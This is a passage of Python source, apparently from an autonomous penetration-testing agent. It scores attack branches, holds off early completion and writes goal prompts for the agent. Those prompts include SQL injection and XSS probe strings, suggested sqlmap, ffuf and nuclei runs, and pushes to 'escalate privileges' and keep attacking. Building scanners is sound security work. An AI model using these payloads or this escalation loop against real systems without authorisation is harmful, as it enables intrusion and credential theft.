                lines.append(f"   Next step: {b.next_step}")
            if b.last_report:
                lines.append(f"   Latest report: {b.last_report[:160]}")
            if b.blocker:
                lines.append(f"   Current blocker: {b.blocker[:160]}")
            lines.append("   Stay on this branch until you prove it, exhaust it, or spawn a stronger child branch.")
            if b.owner == "memory":
                lines.append("   This is a carry-over memory branch: revalidate it quickly, then push past previously known depth.")
        elif open_candidates and not _chain_pressure:
            c = open_candidates[0]
            lines.append(f"\n>> YOUR GOAL: Exhaust vector candidate {c.id}.")
            lines.append(f"   Hypothesis: {c.title}. Evidence: {c.evidence or 'seeded'}")
            lines.append("   Pick any tool that proves/refutes it; do not finish until it is found, clean, blocked, or dead.")
        elif retry_candidates and not _chain_pressure:
            c = retry_candidates[0]
            lines.append(f"\n>> YOUR GOAL: Resolve retryable vector candidate {c.id}.")
            lines.append(f"   Last try: {c.last_tool} -> {c.last_summary[:160]}")
            lines.append("   Change route/tool/payload, or mark it blocked/dead through clear evidence.")
        elif untested and not _chain_pressure:
            goal = untested[0]
            lines.append(f"\n>> YOUR GOAL: Test {goal}.")
            if goal == "SQLi":
                lines.append("   Try: shell_exec sqlmap on an endpoint, or browser_fill_form with ' OR 1=1--")
            elif goal == "XSS":
                lines.append("   Try: browser_navigate to /search?q=<script>alert(1)</script>, then browser_eval_js")
            elif goal == "Auth bypass":
                lines.append("   Try: browser_navigate to login page, browser_fill_form with test creds")
            elif goal == "IDOR":
                lines.append("   Try: access /api/Users/2 or /api/Orders/2 with and without auth token")
            elif goal == "Dir bruteforce":
                lines.append("   Try: shell_exec ffuf with common.txt wordlist")
            elif goal == "CVE scan":
                lines.append("   Try: shell_exec nuclei with http/cves templates")
        elif _chain_pressure:
            lines.append("\n>> PRIMARY GOAL: link_chain NOW — you have findings but 0 chains.")
            lines.append("   DO NOT call finish_scan until you've tried every chain above.")
            if untested:
                lines.append(f"   Secondary: also test {untested[0]} when you run out of chain ideas.")

        elif reported:
            lines.append("\n>> Good progress. But DO NOT stop here.")
            lines.append("   The more findings you discover, the better the report.")
            lines.append("   Dig DEEPER into every endpoint. If there's even a hint of a")
            lines.append("   vulnerability, pursue it until you hit a dead end.")
            lines.append("   Use EVERYTHING you know — try edge cases, combine payloads,")
            lines.append("   fuzz parameters, test auth boundaries, escalate privileges.")
            if existing_chains and len(existing_chains) < _desired_chains:
                lines.append(f"   Build more chains — {_desired_chains} total is the floor.")
        else:
            lines.append("\n>> No findings yet. Be more aggressive.")

        lines.append("═══ Use ALL your knowledge. Every finding matters. Keep digging. ═══")
        return "\n".join(lines)

    def _blocking_finish_branches(self) -> list[BranchState]:
        """Return active branches that still represent unfinished proof work.

        Strix's root agent does not finish while meaningful work remains active.
        Mirror that here by treating high-priority unresolved branches as
        finish blockers, especially pivot branches spawned from confirmed
        findings that still need impact expansion.
        """
        blockers: list[BranchState] = []
        for branch in self.state.active_branches():
            if self._should_exhaust_stale_root_branch(branch):
                branch.status = "exhausted"
                branch.last_report = (
                    branch.last_report
                    or "exhausted after linked candidate terminated and no live child pivots remained"
                )[:160]
                continue
            if branch.priority < 85:
                continue
            if not self._branch_has_finish_blocking_yield(branch):
                branch.status = "exhausted"
                branch.last_report = (
                    branch.last_report
                    or "exhausted after low expected yield and no remaining platform-appropriate pivots"
                )[:160]
                continue
            blockers.append(branch)
        return self._dedupe_blocking_campaign_branches(blockers)

    def _dedupe_blocking_campaign_branches(self, blockers: list[BranchState]) -> list[BranchState]:
        deduped: list[BranchState] = []
        seen: set[tuple[str, str]] = set()
        for branch in blockers:
            if branch.source_finding_id:
                key = (branch.source_finding_id, branch.phase or "surface")
                if key in seen:
                    continue
                seen.add(key)
            deduped.append(branch)
        return deduped

    def _has_live_child_branch(self, branch: BranchState) -> bool:
        for child_id in branch.child_ids:
            child = self.state.branches.get(child_id)
            if child is None:
                continue
            if child.status not in _TERMINAL_BRANCH_STATUSES:
                return True
        return False

    def _linked_candidate_for_branch(self, branch: BranchState) -> VectorCandidate | None:
        for candidate_id in (branch.source_candidate_id, branch.id):
            if not candidate_id:
                continue
            candidate = self.state.vector_candidates.get(candidate_id)
            if candidate is not None:
                return candidate
        return None

    def _latest_report_finding_args(self) -> dict[str, Any] | None:
        for message in reversed(self.state.messages):
            if message.get("role") != "tool":
                continue
            content = message.get("content", {})
            if not isinstance(content, dict) or content.get("name") != "report_finding":
                continue
            args = content.get("args", {})
            if isinstance(args, dict):
                return dict(args)
        return None

    def _hydrate_verify_finding_args(self, args: dict[str, Any]) -> dict[str, Any]:
        merged = dict(args or {})
        if all(str(merged.get(key, "")).strip() for key in ("finding_type", "affected_component", "evidence")):
            return merged
        source: dict[str, Any] | None = None
        latest = self._latest_report_finding_args()
        if latest is not None:
            source = latest
        try:
            from vxis.agent.tools.finding_tools import _get_findings
            findings = list(_get_findings() or [])
        except Exception:
            findings = []
        wanted_type = str(merged.get("finding_type", "")).strip().lower()
        wanted_component = str(merged.get("affected_component", "")).strip()
        wanted_title = str(merged.get("title", "")).strip().lower()
        best_score = -1
        for finding in findings:
            if not isinstance(finding, dict):
                continue
            score = 0
            f_type = str(finding.get("finding_type", "")).strip().lower()
            f_component = str(finding.get("affected_component", "")).strip()
            f_title = str(finding.get("title", "")).strip().lower()
            if wanted_type and wanted_type == f_type:
                score += 5
            if wanted_component and wanted_component == f_component:
                score += 6
            if wanted_title and wanted_title == f_title:
                score += 4
            if wanted_title and wanted_title and wanted_title in f_title:
                score += 2
            if wanted_component and wanted_component and wanted_component in f_component:
                score += 2
            if score > best_score:
                best_score = score
                source = finding
        if source is None:
            return merged
        field_map = {
            "title": "title",
            "severity": "severity",
            "finding_type": "finding_type",
            "affected_component": "affected_component",
            "description": "description",
            "impact": "impact",
            "technical_analysis": "technical_analysis",
            "poc_description": "poc_description",
            "poc_script_code": "poc_script_code",
            "evidence": "evidence",
        }
        for target_key, source_key in field_map.items():
            if not str(merged.get(target_key, "")).strip() and str(source.get(source_key, "")).strip():
                merged[target_key] = source.get(source_key, "")
        return merged

    def _should_exhaust_stale_root_branch(self, branch: BranchState) -> bool:
        if branch.source_finding_id:
            return False
        if branch.owner != "root":
            return False
        if self._has_live_child_branch(branch):
            return False
        candidate = self._linked_candidate_for_branch(branch)
        if candidate is None:
            return False
        if candidate.status not in {"failed", "blocked", "dead", "clean", "found"}:
            return False
        if self._forced_branch_action(branch) is not None:
            return False
        family = self._branch_family(branch)
        if branch.role == "recon_worker" or family in {"infra", "disclosure"}:
            return True
        if branch.attempts >= 2 and candidate.status == "found":
            try:
                from vxis.agent.tools.finding_tools import _canonical_finding_type as _canon_ft
            except Exception:
                _canon_ft = lambda value: str(value or "").strip().lower()
            related_types = self._family_related_types(family)
            found_types = {
                _canon_ft(str(item.get("finding_type", "")))
                for item in self.state.findings
                if isinstance(item, dict)
            }
            if related_types and (related_types & found_types):
                return True
        return False

    def _branch_expected_yield_score(self, branch: BranchState) -> int:
        try:
            from vxis.agent.tools.finding_tools import _canonical_finding_type as _canon_ft
        except Exception:
            _canon_ft = lambda value: str(value or "").strip().lower()
        score = int(branch.priority)
        if branch.source_finding_id:
            score += 10
        if branch.role == "post_exploit_worker":
            score += 8
        if branch.phase in {"data_access", "chain_closure"}:
            score += 5
        score -= max(0, branch.attempts - 1) * 12
        if branch.status == "blocked":
            score -= 18
        if branch.last_tool == "run_skill" and "blocked" in str(branch.last_summary).lower():
            score -= 20
        if branch.blocker:
            score -= 8
        next_action = self._forced_branch_action(branch)
        if next_action is None:
            score -= 28
        else:
            score += 6
        family = self._branch_family(branch)
        related_types = self._family_related_types(family)
        related_skills = self._family_related_skills(family)
        found_types = {
            _canon_ft(str(item.get("finding_type", "")))
            for item in self.state.findings
            if isinstance(item, dict)
        }
        covered_family = bool(related_types & found_types)
        is_memory_branch = branch.owner == "memory" or branch.id.startswith("carry:")
        if covered_family:
            if is_memory_branch:
                score -= 34
                if not branch.source_finding_id:
                    score -= 18
                if branch.attempts > 0:
                    score -= 12
            elif branch.status == "blocked" and not branch.source_finding_id:
                score -= 24
        if related_skills and all(self._recent_blocked_skill_count(skill) >= 3 for skill in related_skills):
            score -= 18
            if is_memory_branch:
                score -= 14
        if branch.owner == "memory":
            score -= 10
        if branch.id.startswith("carry:"):
            score -= 12
        if branch.attempts == 0:
            score += 8
        if family == "disclosure" and self._has_stronger_foothold_than_disclosure():
            score -= 26
            if branch.source_finding_id:
                score -= 10
        if family == "disclosure" and self._disclosure_campaign_lacks_reusable_material():
            score -= 34
            if branch.source_finding_id:
                score -= 12
        if family == "injection" and self._branch_lacks_meaningful_db_impact(branch):
            score -= 40
        if self._branch_is_redundant_family_root(branch):
            score -= 40
        if self._branch_is_redundant_memory_revalidation(branch):
            score -= 48
        return score

    def _branch_is_redundant_family_root(self, branch: BranchState) -> bool:
        if branch.source_finding_id:
            return False
        if branch.owner not in {"root", ""}:
            return False
        if branch.parent_branch_id:
            return False
        family = self._branch_family(branch)
        if family == "generic":
            return False
        if branch.attempts >= 1 and any(
            other.id != branch.id
            and other.status not in {"proven", "exhausted", "dead", "blocked"}
            and self._branch_family(other) == family
            and bool(other.source_finding_id)
            and other.role == "post_exploit_worker"
            for other in self.state.branches.values()
        ):
            return True
        if branch.attempts < 2:
            return False
        children = [
            self.state.branches.get(child_id)
            for child_id in branch.child_ids
        ]
        live_children = [
            child for child in children
            if child is not None and child.status not in {"proven", "exhausted", "dead", "blocked"}
        ]
        if not live_children:
            return False
        if not any(child.source_finding_id for child in live_children):
            return False
        sibling_or_child_coverage = any(
            self._branch_family(child) == family and child.role == "post_exploit_worker"
            for child in live_children
        )
        return sibling_or_child_coverage

    def _branch_is_redundant_memory_revalidation(self, branch: BranchState) -> bool:
        if not (branch.owner == "memory" or branch.id.startswith("carry:") or branch.id.startswith("memory:")):
            return False
        family = self._branch_family(branch)
        if family == "generic":
            return False
        try:
            from vxis.agent.tools.finding_tools import _canonical_finding_type as _canon_ft
        except Exception:
            _canon_ft = lambda value: str(value or "").strip().lower()
        related_types = self._family_related_types(family)
        found_types = {
            _canon_ft(str(item.get("finding_type", "")))
            for item in self.state.findings
            if isinstance(item, dict)
        }
        if branch.attempts == 0 and related_types and (related_types & found_types):
            return True
        if any(
            other.id != branch.id
            and other.status not in {"proven", "exhausted", "dead", "blocked"}
            and self._branch_family(other) == family
            and other.owner != "memory"
            and not other.id.startswith(("carry:", "memory:"))
            for other in self.state.branches.values()
        ):
            return True
        return any(
            other.id != branch.id
            and other.status not in {"proven", "exhausted", "dead", "blocked"}
            and self._branch_family(other) == family
            and other.owner != "memory"
            and not other.id.startswith(("carry:", "memory:"))
            and (
                other.source_finding_id
                or other.role == "post_exploit_worker"
                or other.attempts > 0
            )
            for other in self.state.branches.values()
        )

    def _branch_has_finish_blocking_yield(self, branch: BranchState) -> bool:
        score = self._branch_expected_yield_score(branch)
        if branch.owner == "memory" or branch.id.startswith(("carry:", "memory:")):
            return score >= 82
        if branch.source_finding_id:
            return score >= 65
        if self._branch_family(branch) == "disclosure" and self._has_stronger_foothold_than_disclosure():
            return score >= 78
        if self._branch_family(branch) == "disclosure" and self._disclosure_campaign_lacks_reusable_material():
            return score >= 82
        return branch.attempts < 2 or score >= 78

    def _campaign_groups_for_ui(self, limit: int = 4) -> list[dict[str, Any]]:
        groups: list[dict[str, Any]] = []
        by_key: dict[tuple[str, str], dict[str, Any]] = {}
        blockers = {branch.id for branch in self._blocking_finish_branches()}
        for branch in self.state.active_branches():
            key = (
                branch.source_finding_id or branch.parent_branch_id or branch.id,
                branch.crown_jewel or self._branch_family(branch) or "generic",
            )
            group = by_key.get(key)
            if group is None:
                group = {
                    "campaign_id": key[0],
                    "crown_jewel": key[1],
                    "family": self._branch_family(branch),
                    "source_finding_id": branch.source_finding_id,
                    "branch_ids": [],
                    "roles": set(),
                    "phases": set(),
                    "blockers": 0,
                    "max_priority": 0,
                    "headline": branch.title,
                    "next_step": branch.next_step,
                    "objective": branch.objective,
                }
                by_key[key] = group
                groups.append(group)
            group["branch_ids"].append(branch.id)
            group["roles"].add(branch.role)
            group["phases"].add(branch.phase or "surface")
            group["max_priority"] = max(int(group["max_priority"]), int(branch.priority))
            if branch.id in blockers:
                group["blockers"] = int(group["blockers"]) + 1
            if branch.source_finding_id and branch.next_step:
                group["next_step"] = branch.next_step
            if branch.source_finding_id and branch.objective:
                group["objective"] = branch.objective
        scored = sorted(
            groups,
            key=lambda item: (
                int(item["blockers"]) > 0,
                int(item["max_priority"]),
                len(item["branch_ids"]),
            ),
            reverse=True,
        )
        out: list[dict[str, Any]] = []
        for item in scored[:limit]:
            out.append({
                "campaign_id": item["campaign_id"],
                "headline": str(item["headline"])[:84],
                "source_finding_id": item["source_finding_id"],
                "crown_jewel": str(item["crown_jewel"])[:72],
                "family": item["family"],
                "roles": sorted(str(role) for role in item["roles"]),
                "phases": sorted(str(phase) for phase in item["phases"]),
                "branch_count": len(item["branch_ids"]),
                "blocking_count": int(item["blockers"]),
                "max_priority": int(item["max_priority"]),
                "objective": str(item["objective"])[:96],
                "next_step": str(item["next_step"])[:96],
            })
        return out

    def _focus_campaign_for_ui(self) -> dict[str, Any] | None:
        groups = self._campaign_groups_for_ui(limit=8)
        if not groups:
            return None
        focus = self._focus_branch()
        selected = groups[0]
        if focus is not None:
            focus_family = self._branch_family(focus)
            for group in groups:
                campaign_id = str(group.get("campaign_id") or "")
                if focus.source_finding_id and campaign_id == focus.source_finding_id:
                    selected = group
                    break
                if not focus.source_finding_id and campaign_id == (focus.parent_branch_id or focus.id):
                    selected = group
                    break
                if str(group.get("family") or "") == focus_family:
                    selected = group
                    break
        family = str(selected.get("family") or "")
        reviews: list[dict[str, Any]] = []
        for item in self.state.review_queue_as_dicts():
            source_type = str(item.get("source_finding_type") or "").lower()
            reason = str(item.get("reason") or "").lower()
            affected = str(item.get("affected_component") or "").lower()
            if family and (family in source_type or family in reason or family in affected):
                reviews.append({
                    "stage": item.get("stage", ""),
                    "status": item.get("status", ""),
                    "title": str(item.get("title") or "")[:72],
                    "reason": str(item.get("reason") or "")[:120],
                })
        findings: list[dict[str, Any]] = []
        for finding in self.state.findings[-12:]:
            if not isinstance(finding, dict):
                continue
            blob = " ".join(
                str(finding.get(key, ""))
                for key in ("finding_type", "title", "affected_component", "impact")
            ).lower()
            if family and family in blob:
                findings.append({
                    "id": finding.get("id", ""),
                    "title": str(finding.get("title") or "")[:88],
                    "finding_type": finding.get("finding_type", ""),
                    "severity": finding.get("severity", ""),
                    "affected_component": str(finding.get("affected_component") or "")[:88],
                })
        detail = dict(selected)
        detail["reviews"] = reviews[:3]
        detail["findings"] = findings[-3:]
        return detail

    def _has_stronger_foothold_than_disclosure(self) -> bool:
        blobs = []
        for finding in self.state.findings:
            if not isinstance(finding, dict):
                continue
            blobs.append(" ".join(
                str(finding.get(key, ""))
                for key in ("finding_type", "title", "impact", "technical_analysis", "poc_description")
            ).lower())
        return any(
            any(token in blob for token in ("authentication bypass", "authenticated foothold", "session takeover", "token acquired"))
            or ("sql_injection" in blob and any(token in blob for token in ("authenticated", "login", "token", "session")))
            for blob in blobs
        )

    def _disclosure_campaign_lacks_reusable_material(self) -> bool:
        reasons: list[str] = []
        for item in self.state.review_queue.values():
            if str(item.source_finding_type or "").lower() in {"information_disclosure", "misconfiguration"}:
                reasons.append(str(item.reason or "").lower())
        for item in self.state.review_history:
            if str(item.source_finding_type or "").lower() in {"information_disclosure", "misconfiguration"}:
                reasons.append(str(item.reason or "").lower())
        binary_only_hits = sum(
            1
            for reason in reasons
            if "binary/compressed blob" in reason or "without readable secret material" in reason
        )
        if binary_only_hits < 2:
            return False
        finding_blob = " ".join(
            " ".join(
                str(finding.get(key, ""))
                for key in ("title", "impact", "technical_analysis", "poc_description", "poc_script_code")
            ).lower()
            for finding in self.state.findings
            if isinstance(finding, dict)
            and str(finding.get("finding_type", "")).lower() in {"information_disclosure", "misconfiguration"}
        )
        reusable_markers = (
            "password", "token", "jwt", "apikey", "api key", "secret", "credential",
            "session", "bearer", "admin", "login", "cookie",
        )
        return not any(marker in finding_blob for marker in reusable_markers)

    def _branch_lacks_meaningful_db_impact(self, branch: BranchState) -> bool:
        if "db" not in " ".join((branch.id, branch.title, branch.crown_jewel, branch.objective)).lower():
            return False
        if branch.attempts < 2:
            return False
        blob = " ".join((
            branch.last_summary,
            branch.last_report,
            branch.evidence,
        )).lower()
        strong_markers = (
            "table", "schema", "database", "dump", "union select", "sqlmap", "credential", "admin", "user"
        )
        if any(marker in blob for marker in strong_markers):
            return False
        for finding in self.state.findings:
            if not isinstance(finding, dict):
                continue
            if branch.source_finding_id and str(finding.get("id", "")) == branch.source_finding_id:
                continue
            finding_blob = " ".join(
                str(finding.get(key, ""))
                for key in ("finding_type", "title", "impact", "technical_analysis", "poc_script_code")
            ).lower()
            if any(marker in finding_blob for marker in strong_markers):
                return False
        return True

    def _latest_auth_token(self) -> str:
        for message in reversed(self.state.messages[-96:]):
            if message.get("role") != "tool":
                continue
            content = message.get("content", {})
            if not isinstance(content, dict) or content.get("name") != "run_skill":
                continue
            result = content.get("result", {})
            if not isinstance(result, dict):
                continue
            data = result.get("data", {})
            if not isinstance(data, dict):
                continue
            token = str(data.get("token") or "").strip()
            if token:
                return token
        return ""

    def _candidate_expected_yield_score(self, candidate: VectorCandidate, findings: list[dict[str, Any]]) -> int:
        try:
            from vxis.agent.tools.finding_tools import _canonical_finding_type as _canon_ft
        except Exception:
            _canon_ft = lambda value: str(value or "").strip().lower()
        score = int(candidate.priority)
        if candidate.attempts > 0:
            score -= candidate.attempts * 12
        family = self._candidate_family(candidate)
        related_types = self._family_related_types(family)
        related_skills = self._family_related_skills(family)
        if family == "infra":
            related_skills.add("enumerate_endpoints")
        found_types = {
            _canon_ft(str(item.get("finding_type", "")))
            for item in findings
            if isinstance(item, dict)
        }
        covered_family = bool(related_types & found_types)
        is_memory_candidate = str(candidate.id).startswith("memory:")
        if covered_family:
            score -= 32
            if is_memory_candidate:
                score -= 28
        if related_skills and all(self._recent_blocked_skill_count(skill) >= 3 for skill in related_skills):
            score -= 28
            if is_memory_candidate:
                score -= 14
        if is_memory_candidate and candidate.attempts == 0:
            score -= 10
        if candidate.status in {"blocked", "failed", "dead"}:
            score -= 18
        return score

    def _candidate_family(self, candidate: VectorCandidate) -> str:
        vector_blob = " ".join((candidate.id, candidate.vector_id)).lower()
        blob = " ".join((candidate.vector_id, candidate.title, candidate.evidence)).lower()
        return self._family_from_blobs(vector_blob, blob)

    def _branch_family(self, branch: BranchState) -> str:
        vector_blob = " ".join((
            branch.id,
            branch.vector_id,
            branch.source_candidate_id,
            branch.source_finding_id,
        )).lower()
        blob = " ".join((
            branch.vector_id,
            branch.title,
            branch.objective,
            branch.next_step,
            branch.evidence,
            branch.blocker,
            branch.crown_jewel,
        )).lower()
        return self._family_from_blobs(vector_blob, blob)

    def _family_from_blobs(self, vector_blob: str, blob: str) -> str:
        explicit_map = {
            "web:xss": "xss",
            "web:ssrf": "ssrf",
            "web:sqli": "injection",
            "web-sqli": "injection",
            "web-xss": "xss",
            "web-ssrf": "ssrf",
            "web:idor": "idor",
            "web-idor": "idor",
            "web:auth-bypass": "auth",
            "web-auth": "auth",
            "web:sensitive-files": "disclosure",
            "web-misconf": "disclosure",
            "web:dir-bruteforce": "infra",
            "web-cve": "infra",
        }
        for needle, family in explicit_map.items():
            if needle in vector_blob:
                return family
        for family, tokens, _types in _WEB_VECTOR_FAMILY_RULES:
            if any(token in blob for token in tokens):
                return family
        return "generic"

    def _family_related_types(self, family: str) -> set[str]:
        for rule_family, _tokens, family_types in _WEB_VECTOR_FAMILY_RULES:
            if family == rule_family:
                return set(family_types)
        return set()

    def _family_related_skills(self, family: str) -> set[str]:
        if family == "auth":
            return {"attempt_auth", "post_auth_enum"}
        if family == "injection":
            return {"test_injection"}
        if family == "idor":
            return {"test_idor"}
        if family == "disclosure":
            return {"test_sensitive_files", "test_infra"}
        if family == "xss":
            return {"test_xss"}
        if family == "ssrf":
            return {"test_ssrf"}
        if family == "infra":
            return {"test_infra"}
        return set()

    def _candidate_has_finish_blocking_yield(self, candidate: VectorCandidate, findings: list[dict[str, Any]]) -> bool:
        if candidate.priority < 75 or candidate.attempts > 0:
            return False
        threshold = 78 if str(candidate.id).startswith("memory:") else 72
        return self._candidate_expected_yield_score(candidate, findings) >= threshold

    def _remaining_high_yield_family_candidates(self, findings: list[dict[str, Any]]) -> list[VectorCandidate]:
        open_candidates = [
            c for c in self.state.open_vector_candidates()
            if self._candidate_has_finish_blocking_yield(c, findings)
        ]
        deduped: list[VectorCandidate] = []
        seen_families: set[str] = set()
        for candidate in open_candidates:
            family = self._candidate_family(candidate)
            if family in seen_families and family != "generic":
                continue
            seen_families.add(family)
            deduped.append(candidate)
        return deduped

    def _retryable_family_candidates(self, findings: list[dict[str, Any]]) -> list[VectorCandidate]:
        retryable = [
            c for c in self.state.open_vector_candidates()
            if c.status == "retryable" and self._candidate_expected_yield_score(c, findings) >= 48
        ]
        deduped: list[VectorCandidate] = []
        seen_families: set[str] = set()
        for candidate in retryable:
            family = self._candidate_family(candidate)
            if family in seen_families and family != "generic":
                continue
            seen_families.add(family)
            deduped.append(candidate)
        return deduped

    def _next_retry_round(self, skill_name: str, candidate: VectorCandidate | None = None) -> int | None:
        skill = str(skill_name).strip().lower()
        if skill not in {"test_injection", "test_xss", "test_ssrf"}:
            return None
        seen_round = 1
        if candidate is not None:
            match = re.search(r"round\s+(\d+)", str(candidate.last_summary or ""), re.IGNORECASE)
            if match:
                try:
                    seen_round = max(seen_round, int(match.group(1)))
                except Exception:
                    pass
        for message in self.state.messages[-48:]:
            if message.get("role") != "tool":
                continue
            content = message.get("content", {})
            if not isinstance(content, dict) or content.get("name") != "run_skill":
                continue
            args = content.get("args", {})
            if not isinstance(args, dict):
                continue
            if str(args.get("skill") or "").strip().lower() != skill:
                continue
            params = args.get("params", {})
            if isinstance(params, dict):
                try:
                    seen_round = max(seen_round, int(params.get("round", 1)))
                except Exception:
                    pass
        return min(seen_round + 1, 3)

    def _maybe_finalize_budget_exhausted_scan(self) -> bool:
        if self.state.completed:
            return True
        try:
            from vxis.agent.tools.finding_tools import _get_chains, _get_findings
            findings = list(_get_findings() or [])
            chains = list(_get_chains() or [])
        except Exception:
            findings = list(self.state.findings or [])
            chains = []
        if not findings:
            return False
        if self._blocking_finish_branches():
            return False
        open_candidates = self._remaining_high_yield_family_candidates(findings)
        if open_candidates:
            return False
        desired = self._desired_chain_count(findings)
        if desired > 0 and len(chains) < desired:
            return False
        self.state.completed = True
        self.state.record_review_decision(
            stage="judge",
            verdict="ACCEPTED",
            title="budget_exhausted_completion",
            reason=(
                "Scan budget was exhausted after meaningful branches were resolved and no high-yield blockers remained."
            ),
            action_hint="Finalize reporting; remaining work is low-yield relative to the exhausted budget.",
            blocked_action="finish_scan",
            affected_component=self.state.target,
        )
        for item in self.state.review_queue.values():
            if item.stage == "judge" and item.title in {
                "unfinished_branches",
                "needs_chains",
                "unattempted_candidates",
                "premature_finish",
            }:
                item.status = "closed"
        self.state.add_message("system", {
            "hint": (
                "SYSTEM HINT: scan budget exhausted with no meaningful blockers remaining. "
                "Accepting completion and finalizing the current report set."
            ),
        })
        return True

    @staticmethod
    def _finish_branch_guard_until(max_iters: int) -> int:
        """Keep branch pressure high on real scans without deadlocking short smokes."""
        return min(max_iters, min(60, max(3, max_iters - 5)))

    @staticmethod
    def _error_oracle_preview_is_actionable(preview: str) -> bool:
        """Only promote 500s that leak concrete backend details."""
        if not preview:
            return False
        lower = preview.lower()
        markers = (
            "traceback",
            "stack trace",
            "exception:",
            "sql",
            "sqlite",
            "mysql",
            "postgres",
            "ora-",
            "syntax error",
            "sequelize",
            "typeorm",
            "prisma",
            "undefined",
            "cannot read",
        )
        return any(marker in lower for marker in markers)

    def _record_judge_escalation(
        self,
        *,
        title: str,
        reason: str,
        action_hint: str,
        affected_component: str = "",
    ) -> None:
        self.state.record_review_item(
            f"judge:{title}:{affected_component or self.state.target}",
            stage="judge",
            status="escalated",
            title=title,
            reason=reason,
            action_hint=action_hint,
            affected_component=affected_component or self.state.target,
        )

    def _record_verifier_decision(
        self,
        *,
        args: dict[str, Any],
        verdict: str,
        reasoning: str,
        confidence: str = "",
    ) -> None:
        stage = "verifier"
        title = str(args.get("title", "finding review"))
        component = str(args.get("affected_component", ""))
        source_finding_type = str(args.get("finding_type", ""))
        action_hint = {
            "CONFIRMED": "Keep chaining this finding toward impact.",
            "UNCONFIRMED": "Gather control pairs or stronger exploit transcript before reporting again.",
            "REFUTED": "Do not report this again unless you obtain materially different evidence.",
        }.get(verdict, "")
        item_status = "open" if verdict == "UNCONFIRMED" else "closed"
        if verdict == "CONFIRMED":
            item_status = "closed"
        self.state.record_review_item(
            f"verify:{title}:{component}",
            stage=stage,
            status=item_status,
            title=title,
            reason=reasoning or f"Verifier returned {verdict}.",
            action_hint=action_hint,
            affected_component=component,
            source_finding_type=source_finding_type,
        )
        self.state.record_review_decision(
            stage=stage,
            verdict=verdict,
            title=title,
            reason=(f"[{confidence}] " if confidence else "") + (reasoning or f"Verifier returned {verdict}."),
            action_hint=action_hint,
            blocked_action="report_finding" if verdict == "REFUTED" else "",
            affected_component=component,
            source_finding_type=source_finding_type,
        )

    def _reject_finish_scan(
        self,
        *,
        title: str,
        reason: str,
        action_hint: str,
        summary: str,
        data: dict[str, Any],
        affected_component: str = "",
    ) -> None:
        component = affected_component or self.state.target
        self._record_judge_escalation(
            title=title,
            reason=reason,
            action_hint=action_hint,
            affected_component=component,
        )
        self.state.record_review_decision(
            stage="judge",
            verdict="REJECTED",
            title=title,
            reason=reason,
            action_hint=action_hint,
            blocked_action="finish_scan",
            affected_component=component,
        )
        self.state.add_message("tool", {
            "name": "finish_scan", "args": {},
            "result": {
                "ok": False,
                "summary": summary,
                "data": data,
            },
        })

    def _recent_finish_rejections(self, *, limit: int = 3) -> list[ReviewDecision]:
        items = [
            item for item in self.state.review_history
            if item.stage == "judge" and item.blocked_action == "finish_scan"
        ]
        return items[-limit:]

    def _judge_replan_hint(self) -> str:
        focus = self._focus_branch()
        if focus and focus.status not in {"proven", "exhausted", "dead", "blocked"}:
            return (
                f"Focus on branch {focus.id} [{focus.role}/{focus.phase}] and advance it with a concrete "
                f"exploit, data-access, or chain-building step before trying to finish again."
            )
        findings = list(self.state.findings or [])
        auth_titles = " ".join(str(f.get("title", "")).lower() for f in findings)
        finding_types = {str(f.get("finding_type", "")).lower() for f in findings}
        if (
            any(token in auth_titles for token in ("authentication bypass", "authenticated", "token acquired"))
            or "weak_auth" in finding_types
            or "broken_access_control" in finding_types
        ):
            return (
                "Reuse the foothold now: validate post-authenticated data access, enumerate admin/API routes, "
                "and link the auth finding to the post-auth data exposure before trying finish_scan again."
            )
        for item in reversed(self.state.review_queue_as_dicts()):
            title = str(item.get("title", "")).lower()
            if title == "needs_chains":
                return (
                    "Build or validate an attack chain next. Link confirmed findings together or push a "
                    "post-exploit branch until it proves a concrete pivot."
                )
            if title == "unfinished_branches":
                return "Close the highest-priority open branch by proving, exhausting, or blocking it with evidence."
            if title == "unattempted_candidates":
                return "Exercise at least one unresolved high-priority vector candidate with a concrete payload."
        return "Perform one concrete high-signal action before attempting finish_scan again."

    def _forced_candidate_action(self, candidate: VectorCandidate) -> tuple[str, dict[str, Any]] | None:
        allowed = self._platform_allowed_skills()
        if "run_skill" not in self.registry.list_tools() or not allowed:
            return None
        blob = f"{candidate.vector_id} {candidate.title} {candidate.evidence}".lower()
        target = str(self.state.target)
        kind = self._target_kind_name()
        family = self._candidate_family(candidate)
        if kind == "desktop":
            if any(token in blob for token in ("secret", "storage", "keychain", "token")):
                skill = self._pivoted_skill_name("test_local_storage_secrets")
                if skill:
                    return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            if any(token in blob for token in ("deep", "link", "url", "scheme")):
                skill = self._pivoted_skill_name("test_deeplink_abuse")
                if skill:
                    return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            if any(token in blob for token in ("signature", "trust", "entitlement", "binary")):
                skill = self._pivoted_skill_name("test_signature_audit")
                if skill:
                    return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            skill = self._pivoted_skill_name("test_ipc_injection") or self._pivoted_skill_name("test_binary_protections")
            if skill:
                return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            return None
        if kind != "web":
            return None
        family_skill_map = {
            "auth": "attempt_auth",
            "idor": "test_idor",
            "injection": "test_injection",
            "xss": "test_xss",
            "ssrf": "test_ssrf",
            "disclosure": "test_sensitive_files",
            "infra": "enumerate_endpoints",
        }
        family_skill = family_skill_map.get(family)
        if family_skill:
            skill = self._pivoted_skill_name(family_skill)
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                if candidate.status == "retryable":
                    next_round = self._next_retry_round(skill, candidate)
                    if next_round is not None:
                        params["round"] = next_round
                if skill == "attempt_auth" and not params:
                    params = {}
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
        if any(token in blob for token in ("auth", "login", "credential", "session")):
            skill = self._pivoted_skill_name("attempt_auth")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                if skill == "attempt_auth" and not params:
                    params = {}
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        if any(token in blob for token in ("idor", "access_control", "broken_access_control", "object")):
            skill = self._pivoted_skill_name("test_idor")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        if any(token in blob for token in ("sqli", "sql", "injection", "nosql", "ssti")):
            skill = self._pivoted_skill_name("test_injection")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
